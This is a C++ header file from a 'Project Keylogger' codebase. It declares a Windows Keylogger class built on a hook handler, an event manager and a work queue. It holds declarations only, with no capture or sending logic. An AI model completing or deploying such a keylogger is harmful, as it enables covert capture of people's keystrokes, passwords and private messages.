/**
 * Project Keylogger
 */


#ifndef _KEYLOGGER_H
#define _KEYLOGGER_H

#include <Windows.h>
#include <iostream>

#include "AEvent.h"
#include "IKeylogger.h"
#include "EventManager.h"
#include "HookHandler.h"
#include "workQueueManager.h"

class Keylogger : public IKeylogger {
public:
    Keylogger(IWorkQueue *);
	~Keylogger();
    bool				init();   
    bool				run();
    bool				stop();
    bool				kill();
	bool				pushToQueue(const AEvent*);

private: 
	bool				_running;
    EventManager		_eventManager;
    HookHandler			_hookHandler;
    std::vector<AEvent*> _events;
	IWorkQueue*			_levents;
};

#endif //_KEYLOGGER_H
